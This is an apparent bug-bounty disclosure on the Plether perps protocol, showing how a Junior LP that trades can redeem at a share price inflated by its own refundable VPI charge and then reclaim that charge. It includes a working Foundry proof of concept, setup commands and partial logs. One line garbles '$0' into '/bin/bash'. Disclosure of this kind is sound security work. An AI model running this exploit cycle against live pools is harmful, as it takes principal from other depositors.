# \#98847 [SC-Critical] Junior LP can take other LPs' principal by redeeming at a share price inflated by its own VPI charge due to refundable VPI being booked as immediate LP revenue

**Submitted on Nov 10th 2026 at 14:32:17 UTC by @midkernel for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98847
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A Junior LP who also trades can take principal from the other Junior LPs. A skew-increasing open pays a positive VPI charge that `HousePool` books at once as LP revenue, so it raises the Junior share price, yet the same position can reclaim the whole charge as a close rebate under the lifetime VPI clamp. The LP opens a position shortly before an epoch boundary, has its matured redemption funded at the share price that contains its own charge, then closes and is paid the charge back from pool cash. The remaining Junior LPs fund the rebate. On the pinned release with the checked-in deployment parameters, one cycle moved 499.23 units from an honest Junior LP holding 100,000 units to the exiting LP and the protocol fee account, the LP netted 341.17 units, and the cycle repeated three times in eight hours. The cycle is profitable only for an LP that redeems a large share of the Junior tranche (83% in the proof; a 30% holder loses money).

## Vulnerability Details

Affected revision: `immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, files `packages/perps/src/CfdEngineSettlementSidecar.sol`, `packages/perps/src/HousePool.sol`, `packages/perps/src/libraries/CloseAccountingLib.sol` and `packages/perps/src/libraries/CfdEnginePlanLib.sol`.

Expected behavior. The protocol states that LP share pricing must not let LPs withdraw value that a position can still claim. `WHITEPAPER.md` says of the negative-VPI reserve that it "is excluded from the terminal price curve, so LPs cannot withdraw it as marked equity before the matching position obligation settles" ([WHITEPAPER.md#L887-L888](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L887-L888)). `SECURITY.md` says "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV" ([SECURITY.md#L871-L872](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L871-L872)). The close clamp is commented as the defence against this class: "Prevents LP sandwich attacks where an attacker opens at high depth, reduces pool depth, then closes to extract a net-negative lifetime VPI rebate" ([CloseAccountingLib.sol#L112-L118](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118)).

Actual behavior, source evidence.

1. An open that increases skew pays positive VPI as part of its trade cost. The settlement sidecar sends that cash to the pool and records it as revenue with cash arrived ([CfdEngineSettlementSidecar.sol#L446-L464](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L446-L464)):

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

`recordClaimantInflow` increases `accountedAssets` ([HousePool.sol#L640-L642](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L640-L642)). No liability is recorded against it.

2. The next epoch settlement reconciles, which routes the surplus to Junior principal through the waterfall, and then prices Junior redemptions with that principal ([HousePool.sol#L835-L841](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841)):

```solidity
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

result.cutoffEpoch = cutoffEpoch;
RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
```

3. When the position closes, the fresh VPI delta is negative because the close removes the skew. The clamp limits the rebate to the lifetime VPI the position paid, which means the position can reclaim all of it ([CloseAccountingLib.sol#L105-L118](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L105-L118)):

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

4. The close planner pays the rebate from free pool cash and the sidecar transfers it out of the pool to the trader ([CfdEnginePlanLib.sol#L973-L978](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L973-L978), [CfdEngineSettlementSidecar.sol#L621-L624](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624)):

```solidity
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

Failed property. Between steps 1 and 3 the pool holds cash that the position can take back, and LP share pricing counts all of it as Junior equity. The clamp makes the trader leg net to zero VPI, but it does nothing about an LP leg settled in between. An LP that is also the trader therefore receives its redemption share of its own charge and then the full charge again as a rebate. The LPs that remain pay the difference.

Attack sequence. The LP requests redemption of its Junior shares for an upcoming epoch. Shortly before that epoch starts it commits and executes a skew-increasing open through `OrderRouter`. Any caller's `settleLpEpoch` after the boundary funds the redemption at the inflated price. The LP claims, then commits and executes the full close and withdraws. It re-enters with an ordinary deposit request and repeats.

Prerequisites, all present in the proof:

- The actor holds Junior shares and can trade. No privileged role, no price movement and no insolvency are involved.
- The book has room under the skew limit for the open, and LP free cash covers the redemption while the position is open.
- For the cycle to be profitable, the redeemed fraction `s` of the Junior tranche must satisfy `s x VPI > open fee + close fee`. Calculation with the deployment parameters (`vpiFactor` 1%, skew limit 40% of depth, execution fee 4 bps per side, from `script/DeployPerpsArbitrumSepolia.s.sol`) and a book that starts balanced: the VPI at the skew limit is 8 bps of depth and the two fees are 3.2 bps of depth, so `s` must exceed 40%. The proof shows a profit at 83% and a loss at 30%.

Novelty. The program's known-issue list and the prior reports in the repository do not describe this. The closest prior entry is the scan item "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate", which concerns the depth denominator of the close rebate and is bounded by the trader's own paid VPI; it does not involve share pricing. Here the rebate equals the VPI paid at unchanged or lower depth in any case, and the loss to other LPs arises because the redemption in between was priced with that VPI counted as equity. `SECURITY.md` lists under VPI limitations that "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips" ([SECURITY.md#L1443](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1443)), which states the intended protection and does not disclose the LP leg.

## Impact Details

Selected impact: "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield".

Demonstrated on the pinned release with the deployment risk parameters. All amounts are mock settlement tokens with 6 decimals and $0 actual value; the settlement token of the intended deployment is a US dollar stablecoin.

- Pool: Senior 400,000 units, honest Junior LP 100,000 units, redeeming Junior LP 500,000 units, plus the 1,000 unit seeds. The LP opens a 400,000 unit notional LONG with 3,000 units of margin ten seconds before the epoch boundary and pays 798.40 units of VPI and a 160 unit fee.
- An unrelated keeper settles the epoch. The LP's redemption pays 500,661.17 units, against 499,996.94 in the control run without the position.
- The LP closes. The pool pays out 638.40 units (the 798.40 rebate less the 160 unit close fee, which the pool keeps). The LP ends 341.17 units above everything it put in. In the control it ends 3.06 units below.
- The honest Junior LP then exits with 99,496.52 units, against 99,995.75 in the control: a loss of 499.23 units, 49 basis points of its capital, caused by the cycle. It receives less than its 100,000 unit deposit, so the loss is principal.
- Repeating the cycle three times took 28,801 seconds. The honest Junior LP's position was worth 1,500.35 units less than in the control, and the LP was 1,035.35 units better off.
- Observed bound: an LP holding 30% of a Junior-only pool loses 80.73 units on the same cycle relative to its cost.

Per cycle the amount at stake is bounded by the VPI at the skew limit (8 bps of pool depth by the calculation above). The position was open for about twelve seconds in the proof, with the price held constant; an actor is exposed to price movement and to other traders changing the skew for that interval. The loss to the remaining LPs is not recoverable: the rebate has left the pool and no function reassigns it.

## References

- Open cost recorded as pool revenue: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L446-L464
- Revenue increases accounted assets: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L651
- Epoch settlement prices Junior redemptions after reconcile: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L892
- Lifetime VPI clamp at close: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L102-L118
- Close rebate planned from free pool cash: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L970-L978
- Close rebate paid out of the pool: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L618-L624
- VPI potential and rebate on reversal: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L828-L905
- VPI limitations: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1434-L1444
- Deployment risk parameters: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/script/DeployPerpsArbitrumSepolia.s.sol#L434-L447
- Program: https://immunefi.com/audit-competition/plether/


## Proof of Concept

## Proof of Concept

1. Junior LP holds 500,000 units of Junior shares in a pool that also holds 400,000 units of Senior deposits and an honest Junior LP's 100,000 units. It calls `TrancheVault.requestRedeem` on the Junior vault for all of its shares, which queues the redemption for the next epoch.
2. Junior LP, ten seconds before that epoch starts, deposits 5,000 units of trading collateral into `MarginClearinghouse`, commits a LONG open of 400,000 units notional with 3,000 units of margin through `OrderRouter.commitOrder`, and executes it with `OrderRouter.executeOrder` on the next oracle tick. The open pays 798.40 units of VPI and a 160 unit execution fee. HousePool cash rises by the VPI amount.
3. Keeper, an unrelated account, calls `OrderRouter.settleLpEpoch` with a fresh tick after the epoch boundary. HousePool reconciles the VPI into Junior principal and funds the LP's whole redemption at that price.
4. Junior LP calls `TrancheVault.claimRedeem` and receives 500,661.17 units. In the control run without the position it receives 499,996.94 units.
5. Junior LP commits and executes the full close. The close rebate is clamped to the VPI the position paid, and HousePool pays 638.40 units out of pool cash to the LP's clearinghouse account (the 798.40 unit rebate less the 160 unit close fee, which the pool keeps).
6. Junior LP calls `MarginClearinghouse.withdraw`. It now holds 505,341.17 units against 505,000 units of total cost, a gain of 341.17 units. In the control it holds 504,996.94 units.
7. Honest Junior LP later requests and claims a full redemption and receives 99,496.52 units for its 100,000 unit deposit. In the control it receives 99,995.75 units. The cycle cost it 499.23 units.
8. Junior LP deposits 500,000 units again through `TrancheVault.requestDeposit` and repeats steps 1 to 6. After three cycles (28,801 seconds) the honest Junior LP's position is worth 1,500.35 units less than in the control and the LP is 1,035.35 units better off than in the control.

All amounts are mock settlement tokens with 6 decimals and /bin/bash actual value.

The complete proof source is one Foundry test file.

`packages/perps/test/poc-vpi-nav/VpiNavExit.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice A Junior LP that also trades books its own REFUNDABLE positive VPI charge into LP NAV, has its LP shares
///         redeemed at that inflated NAV by the next epoch settlement, then closes the position and is paid the VPI
///         back from pool cash (the lifetime clamp allows a close rebate up to the VPI the position paid).
///         The remaining LPs fund the rebate. The finding path uses production entry points only:
///         TrancheVault.requestRedeem / claimRedeem / requestDeposit / claimDeposit, OrderRouter.commitOrder /
///         executeOrder / settleLpEpoch, MarginClearinghouse.deposit / withdraw. Risk parameters are the checked-in
///         deployment values (script/DeployPerpsArbitrumSepolia.s.sol).
contract VpiNavExitTest is BasePerpTest {

    address internal constant ATTACKER = address(0xA77AC4E2);
    address internal constant HONEST_JUNIOR = address(0x40E5701);
    address internal constant HONEST_SENIOR = address(0x5E4101);
    address internal constant KEEPER = address(0x4EE9E4);

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant TRADING_CASH = 5000e6;

    uint256 internal attackerJuniorDeposit = 500_000e6;
    uint256 internal honestJuniorDeposit = 100_000e6;
    uint256 internal honestSeniorDeposit = 400_000e6;

    struct Outcome {
        uint256 honestJuniorProceeds;
        uint256 attackerFinalCash;
        uint256 attackerRedeemProceeds;
        uint256 vpiPaidAtOpen;
        uint256 rebateAtClose;
        uint256 treasuryFees;
        uint256 juniorPrincipalAtSettle;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // script/DeployPerpsArbitrumSepolia.s.sol::_riskParams()
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _fundLps() internal {
        _fundJunior(HONEST_JUNIOR, honestJuniorDeposit);
        _fundJunior(ATTACKER, attackerJuniorDeposit);
        if (honestSeniorDeposit != 0) {
            _fundSenior(HONEST_SENIOR, honestSeniorDeposit);
        }
    }

    // ------------------------------------------------------------------
    // Scenario A: 400k Senior, 100k honest Junior, 500k attacker Junior (Senior share stays <= 80% afterwards)
    // ------------------------------------------------------------------
    function test_JuniorLpExitsAtOwnRefundableVpiInflatedNav() public {
        _fundLps();
        (Outcome memory control, Outcome memory attack) = _controlAndAttack(4000);

        _logOutcome("control (attacker only redeems)", control);
        _logOutcome("attack  (open -> settle -> close)", attack);

        uint256 attackerCost = attackerJuniorDeposit + TRADING_CASH;
        emit log_named_int(
            "attacker PnL, control (atoms)", int256(control.attackerFinalCash) - int256(attackerCost)
        );
        emit log_named_int("attacker PnL, attack  (atoms)", int256(attack.attackerFinalCash) - int256(attackerCost));
        emit log_named_uint(
            "honest Junior loss caused by the attack (atoms)", control.honestJuniorProceeds - attack.honestJuniorProceeds
        );
        emit log_named_uint(
            "honest Junior loss in bps of its capital",
            ((control.honestJuniorProceeds - attack.honestJuniorProceeds) * 10_000) / honestJuniorDeposit
        );

        assertGt(attack.attackerFinalCash, control.attackerFinalCash, "attack beats plain redemption");
        assertGt(attack.attackerFinalCash, attackerCost, "attacker ends with more USDG than it ever put in");
        assertLt(attack.honestJuniorProceeds, control.honestJuniorProceeds, "honest Junior LP paid for it");
        assertLt(attack.honestJuniorProceeds, honestJuniorDeposit, "honest Junior LP lost principal, not just yield");
        // pool cash out at close == VPI paid at open - 4 bps close fee (kept by the pool), net of a few atoms of carry
        assertApproxEqAbs(attack.rebateAtClose + 160e6, attack.vpiPaidAtOpen, 0.01e6, "close refunds the open VPI");
    }

    // ------------------------------------------------------------------
    // Observed bound: with 30% of the Junior tranche the same cycle costs the LP more in fees than it captures
    // ------------------------------------------------------------------
    function test_bound_ThirtyPercentHolderLosesMoney() public {
        attackerJuniorDeposit = 300_000e6;
        honestJuniorDeposit = 700_000e6;
        honestSeniorDeposit = 0;
        _fundLps();
        (Outcome memory control, Outcome memory attack) = _controlAndAttack(4000);

        _logOutcome("control", control);
        _logOutcome("cycle  ", attack);
        uint256 attackerCost = attackerJuniorDeposit + TRADING_CASH;
        emit log_named_int("LP PnL, control (atoms)", int256(control.attackerFinalCash) - int256(attackerCost));
        emit log_named_int("LP PnL, cycle   (atoms)", int256(attack.attackerFinalCash) - int256(attackerCost));
        assertLt(attack.attackerFinalCash, control.attackerFinalCash, "below break-even share the cycle loses money");
    }

    // ------------------------------------------------------------------
    // Scenario B: the attacker re-deposits and repeats; every cycle takes another slice from the same honest LP
    // ------------------------------------------------------------------
    function test_RepeatableEveryFewEpochs() public {
        _fundLps();
        settlementToken.mint(ATTACKER, TRADING_CASH);
        uint256 honestShares = juniorVault.balanceOf(HONEST_JUNIOR);

        uint256 branch = vm.snapshotState();
        (uint256 honestControl, uint256 attackerControl,) = _threeCycles(false, honestShares);
        vm.revertToState(branch);
        (uint256 honestAttack, uint256 attackerAttack, uint256 elapsed) = _threeCycles(true, honestShares);

        emit log_named_uint("elapsed for 3 cycles (seconds)", elapsed);
        emit log_named_uint("honest Junior value after 3 cycles, control (atoms)", honestControl);
        emit log_named_uint("honest Junior value after 3 cycles, attack  (atoms)", honestAttack);
        emit log_named_uint("honest Junior loss caused by 3 cycles (atoms)", honestControl - honestAttack);
        emit log_named_uint("attacker wealth after 3 cycles, control (atoms)", attackerControl);
        emit log_named_uint("attacker wealth after 3 cycles, attack  (atoms)", attackerAttack);
        emit log_named_uint("attacker gain caused by 3 cycles (atoms)", attackerAttack - attackerControl);
        assertGt(attackerAttack, attackerControl + 900e6, "three cycles, > 900 USDG");
        assertLt(honestAttack + 1400e6, honestControl, "honest LP down > 1,400 USDG on 100k");
    }

    /// @dev Attacker wealth = liquid USDG + the Junior position it re-entered with (valued at fresh Junior NAV).
    function _threeCycles(
        bool sandwich,
        uint256 honestShares
    ) internal returns (uint256 honestValue, uint256 attackerWealth, uint256 elapsed) {
        uint256 start = vm.getBlockTimestamp();
        for (uint256 cycle = 1; cycle <= 3; ++cycle) {
            Outcome memory o;
            _attackCycle(4000, sandwich, o);

            // Re-enter through an ordinary async deposit; profit and TRADING_CASH stay liquid.
            uint256 redeposit = attackerJuniorDeposit;
            vm.startPrank(ATTACKER);
            settlementToken.approve(address(juniorVault), redeposit);
            uint256 depositId = juniorVault.requestDeposit(redeposit, ATTACKER, ATTACKER);
            vm.stopPrank();
            _warpTo(juniorVault.depositEpochStart(depositId));
            bytes[] memory data = _mockPythUpdateData(PRICE);
            router.settleLpEpoch(data);
            vm.startPrank(ATTACKER);
            juniorVault.claimDeposit(
                depositId, juniorVault.claimableDepositRequest(depositId, ATTACKER), ATTACKER, ATTACKER
            );
            vm.stopPrank();
            if (sandwich) {
                emit log_named_uint("cycle", cycle);
                emit log_named_uint("  honest Junior value after reconcile (atoms)", _juniorValue(honestShares));
                emit log_named_uint(
                    "  attacker liquid USDG + Junior position (atoms)",
                    settlementToken.balanceOf(ATTACKER) + _juniorValue(juniorVault.balanceOf(ATTACKER))
                );
            }
        }
        elapsed = vm.getBlockTimestamp() - start;
        honestValue = _juniorValue(honestShares);
        attackerWealth = settlementToken.balanceOf(ATTACKER) + _juniorValue(juniorVault.balanceOf(ATTACKER));
    }

    // ------------------------------------------------------------------
    // internals
    // ------------------------------------------------------------------

    function _controlAndAttack(
        uint256 lots
    ) internal returns (Outcome memory control, Outcome memory attack) {
        settlementToken.mint(ATTACKER, TRADING_CASH);
        uint256 branch = vm.snapshotState();
        _attackCycle(lots, false, control);
        control.honestJuniorProceeds = _honestJuniorExit();
        control.attackerFinalCash = settlementToken.balanceOf(ATTACKER);
        vm.revertToState(branch);
        _attackCycle(lots, true, attack);
        attack.honestJuniorProceeds = _honestJuniorExit();
        attack.attackerFinalCash = settlementToken.balanceOf(ATTACKER);
    }

    /// @dev One cycle. With `sandwich == false` the attacker only redeems (control).
    function _attackCycle(
        uint256 lots,
        bool sandwich,
        Outcome memory o
    ) internal {
        // 1. Ordinary redemption request after the 1h activation cooldown.
        _warpTo(juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        // The position is opened shortly BEFORE the epoch boundary, so whoever settles the epoch funds the redemption
        // at the inflated price; the attacker does not need to win a race against other settlement callers.
        _warpTo(pool.lpEpochStart(redeemId) - 10);

        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
        uint256 size = lots * 1e20;

        // 2. Ten seconds before the boundary: open a skew-creating position through the Router. The VPI charge lands
        //    in the HousePool as LP revenue immediately.
        if (sandwich) {
            vm.startPrank(ATTACKER);
            settlementToken.approve(address(clearinghouse), TRADING_CASH);
            clearinghouse.deposit(ATTACKER, TRADING_CASH);
            uint64 openId = router.nextCommitId();
            router.commitOrder(CfdTypes.Side.LONG, size, 3000e6, 0, false);
            vm.stopPrank();

            uint256 poolBefore = pool.totalAssets();
            bytes[] memory openData = _mockPythUpdateData(PRICE);
            vm.prank(ATTACKER);
            router.executeOrder(openId, openData);
            (uint256 openedSize,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
            assertEq(openedSize, size, "open executed");
            assertGt(vpiAccrued, 0, "positive lifetime VPI");
            o.vpiPaidAtOpen = uint256(vpiAccrued);
            assertEq(pool.totalAssets() - poolBefore, o.vpiPaidAtOpen, "VPI charge is pool cash");
        }

        // 3. Epoch settlement by an unrelated keeper with a fresh post-boundary mark: the redemption is funded at a
        //    Junior price that already contains the attacker's own refundable VPI.
        _warpTo(pool.lpEpochStart(redeemId));
        bytes[] memory settleData = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(settleData);
        o.juniorPrincipalAtSettle = pool.juniorPrincipal();
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        assertEq(claimable, shares, "whole redemption funded in this settlement");
        uint256 cashBeforeClaim = settlementToken.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.claimRedeem(redeemId, claimable, ATTACKER, ATTACKER);
        o.attackerRedeemProceeds = settlementToken.balanceOf(ATTACKER) - cashBeforeClaim;

        // 4. Close. The lifetime clamp allows a rebate up to the VPI paid, and the pool pays it from free cash.
        if (sandwich) {
            uint256 poolBeforeClose = pool.totalAssets();
            uint64 closeId = router.nextCommitId();
            vm.prank(ATTACKER);
            router.commitOrder(CfdTypes.Side.LONG, size, 0, 0, true);
            bytes[] memory closeData = _mockPythUpdateData(PRICE);
            vm.prank(ATTACKER);
            router.executeOrder(closeId, closeData);
            (uint256 remaining,,,,,,) = engine.positions(ATTACKER);
            assertEq(remaining, 0, "close executed");
            o.rebateAtClose = poolBeforeClose - pool.totalAssets();
            assertEq(engine.traderClaimBalanceAssets(ATTACKER), 0, "rebate paid in cash, no claim");

            uint256 balance = clearinghouse.balanceAssets(ATTACKER);
            vm.prank(ATTACKER);
            clearinghouse.withdraw(ATTACKER, balance);
        }
        o.treasuryFees = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;
    }

    function _honestJuniorExit() internal returns (uint256 proceeds) {
        _warpTo(juniorVault.lastDepositTime(HONEST_JUNIOR) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 shares = juniorVault.balanceOf(HONEST_JUNIOR);
        vm.prank(HONEST_JUNIOR);
        uint256 redeemId = juniorVault.requestRedeem(shares, HONEST_JUNIOR, HONEST_JUNIOR);
        _warpTo(pool.lpEpochStart(redeemId));
        bytes[] memory data = _mockPythUpdateData(PRICE);
        router.settleLpEpoch(data);
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, HONEST_JUNIOR);
        assertEq(claimable, shares, "honest redemption funded");
        vm.prank(HONEST_JUNIOR);
        proceeds = juniorVault.claimRedeem(redeemId, claimable, HONEST_JUNIOR, HONEST_JUNIOR);
    }

    function _juniorValue(
        uint256 shares
    ) internal view returns (uint256) {
        return (shares * pool.juniorPrincipal()) / juniorVault.totalSupply();
    }

    function _warpTo(
        uint256 timestamp
    ) internal {
        if (vm.getBlockTimestamp() < timestamp) {
            vm.warp(timestamp);
        }
    }

    function _logOutcome(
        string memory tag,
        Outcome memory o
    ) internal {
        emit log(tag);
        emit log_named_uint("  VPI paid at open (atoms)", o.vpiPaidAtOpen);
        emit log_named_uint("  Junior principal used to price the redemption (atoms)", o.juniorPrincipalAtSettle);
        emit log_named_uint("  attacker redemption proceeds (atoms)", o.attackerRedeemProceeds);
        emit log_named_uint("  pool cash paid out at close (atoms)", o.rebateAtClose);
        emit log_named_uint("  protocol treasury fees (atoms)", o.treasuryFees);
        emit log_named_uint("  attacker final USDG (atoms)", o.attackerFinalCash);
        emit log_named_uint("  honest Junior exit proceeds (atoms)", o.honestJuniorProceeds);
    }

}
```

**Environment and revisions.**

> Warning: run this proof only in a disposable local checkout of the pinned release. It deploys contracts on a local in-memory EVM. Do not point it at a live network and do not use real keys.

- Affected and tested revision: `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, with unmodified production sources under `packages/perps/src`.
- Toolchain: Foundry `forge 1.8.3` (`cae51ad458f6abb64852b7709eb784352429825d`), solc `0.8.35`, the pinned `packages/perps/foundry.toml` profile (`via_ir = true`, optimizer 200 runs). A cold via-IR build takes several minutes and needs roughly 15 GB of memory.
- Topology: the test extends `BasePerpTest` from the same release, which deploys the unmodified production `CfdEngine`, `CfdEngineSettlementSidecar`, `HousePool`, both `TrancheVault` instances, `MarginClearinghouse`, `OrderRouter` (through the release's `LegacyOrderRouterHarness`, which inherits `OrderRouter` and adds only a commit helper that builds a full V3 order request), `OrderRouterExecutionSidecar` and `PletherOracle`.
- Risk parameters: the test overrides `_riskParams()` with the values of `script/DeployPerpsArbitrumSepolia.s.sol` (`vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, `initMarginBps` 20, `maintMarginBps` 10, `baseCarryBps` 500). The execution fee is the Engine default of 4 bps.
- External stand-ins: the release's `MockPyth` and mock settlement token. Behaviour of the deployed Pyth contract and settlement token on Arbitrum One is an unverified production assumption of this proof.
- Production entry points on the finding path: `TrancheVault.requestRedeem`, `claimRedeem`, `requestDeposit`, `claimDeposit`; `MarginClearinghouse.deposit`, `withdraw`; `OrderRouter.commitOrder` (through the harness helper), `executeOrder`, `settleLpEpoch`.

Fixture state and data, not part of the attack:

- Initial LP positions are created with the release helpers `_fundJunior` and `_fundSenior`, which request a deposit, advance time to its epoch, install a setup mark as the Router and settle the epoch. Each tranche also holds the fixture's 1,000 unit seed.
- The helper `_mockPythUpdateData` advances one block and one second and publishes a tick at a constant price of 1.00 before each oracle-backed call, so every execution uses a tick after its commit in a later block.
- Account addresses, deposit sizes and the 4,000 lot order size are test values. The order size is the skew limit for this pool depth.

**Setup.**

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
cd packages/perps
mkdir -p test/poc-vpi-nav
```

Save the source above as `test/poc-vpi-nav/VpiNavExit.t.sol` inside `packages/perps`. No production source is edited.

**Invocation.**

Run from `packages/perps`:

```bash
forge test --match-path 'test/poc-vpi-nav/VpiNavExit.t.sol' -vv
```

**Tests, controls and observed bound.**

- `test_JuniorLpExitsAtOwnRefundableVpiInflatedNav`: steps 1 to 7 and their control. The control branch runs from the same state snapshot with the same redemption and no position. The test asserts that the cycle beats the plain redemption, that the LP ends with more than its total cost, that the honest Junior LP receives less than in the control and less than its deposit, and that the pool's close payout plus the 160 unit close fee equals the VPI paid at open.
- `test_RepeatableEveryFewEpochs`: step 8. Three cycles with re-deposit against a control of three plain redeem and re-deposit rounds from the same snapshot. It asserts a gain above 900 units for the LP and a loss above 1,400 units for the honest Junior LP relative to the control.
- `test_bound_ThirtyPercentHolderLosesMoney` (observed bound): in a Junior-only pool where the LP holds 30% of the Junior tranche, the same cycle leaves the LP 80.73 units below its cost and below the plain redemption. The cycle pays only for an LP that redeems a large share of the tranche.

Evidence provenance: the logs below were recorded by running the setup and invocation above on a fresh clone of the pinned commit. The proof file has SHA-256 `7bb7a421ac816a1951ad7a3d09abfa46eeb674874ee451eb3e443b626db972b2`.

**Cleanup.**

```bash
cd ../../..
rm -rf audit-comp-plether
```

**Demonstrated scope.**

The proof establishes that a redemption funded while the redeeming LP's own skew-increasing position is open is priced with that position's VPI charge counted as Junior equity, that the position then reclaims the charge from pool cash, and that the difference is borne by the remaining Junior LP as a loss of principal. It establishes profitability at 83% of the Junior tranche, a loss at 30%, and three repetitions in 28,801 seconds, at a constant price and with the position open for about twelve seconds per cycle.

### Logs

```text
Ran 3 tests for test/poc-vpi-nav/VpiNavExit.t.sol:VpiNavExitTest
[PASS] test_JuniorLpExitsAtOwnRefundableVpiInflatedNav() (gas: 16822591)
Logs:
  control (attacker only redeems)
    VPI paid at open (atoms): 0
    Junior principal used to price the redemption (atoms): 100999364603
    attacker redemption proceeds (atoms): 499996944884
    pool cash paid out at close (atoms): 0
    protocol treasury fees (atoms): 0
    attacker final USDG (atoms): 504996944884
    honest Junior exit proceeds (atoms): 99995754060
  attack  (open -> settle -> close)
    VPI paid at open (atoms): 798403193
    Junior principal used to price the redemption (atoms): 101133538830
    attacker redemption proceeds (atoms): 500661173850
    pool cash paid out at close (atoms): 638400184
    protocol treasury fees (atoms): 160000000
    attacker final USDG (atoms): 505341170841
